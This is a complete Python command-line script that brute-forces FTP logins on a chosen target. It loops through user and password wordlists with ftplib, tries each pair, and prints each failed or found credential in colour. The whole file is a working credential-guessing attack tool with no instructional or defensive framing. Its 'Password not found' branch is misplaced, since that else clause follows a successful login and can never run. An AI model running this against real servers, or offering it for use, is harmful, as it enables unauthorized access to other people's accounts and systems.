#!/usr/bin/python3

import sys; import ftplib; import argparse; import os;

#Colours
redColour = "\033[31m"
greenColour = "\033[32m"
yellowColour = "\033[33m"
blueColour = "\033[34m"
resetColour = "\033[0m"

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True)
parser.add_argument("-u", "--user")
parser.add_argument("-p", "--password")
args = parser.parse_args()


if bool(args.user) and bool(args.password):
    uwordlist = args.user
    pwordlist = args.password
else:
    uwordlist = "dftwordlists/dftusers.txt"
    pwordlist = "dftwordlists/dftpasswords.txt"

target = args.target


def attack():
    with open(uwordlist, "r") as ufile:
        for user in ufile:
            user = user.strip()
            with open(pwordlist, "r") as pfile:
                for password in pfile:
                    password = password.strip()
                    try:
                        ftp = ftplib.FTP(target)
                        ftp.login(user, password)
                        ftp.quit()
                        os.system("clear")
                        print(f"{greenColour}[+]{resetColour} User:{greenColour}{user}{resetColour} Password:{greenColour}{password}{resetColour}")
                        sys.exit(0)
                    except ftplib.error_perm:
                        os.system("clear")
                        print(f"{redColour}[X]{resetColour} User:{redColour}{user}{resetColour} Password:{redColour}{password}{resetColour}")
                        pass
                    else:
                        print(f"{redColour}Password not found{resetColour}")
                        sys.exit(0)

if __name__ == "__main__":
    try:
        attack()
    except KeyboardInterrupt:
        sys.exit(1)
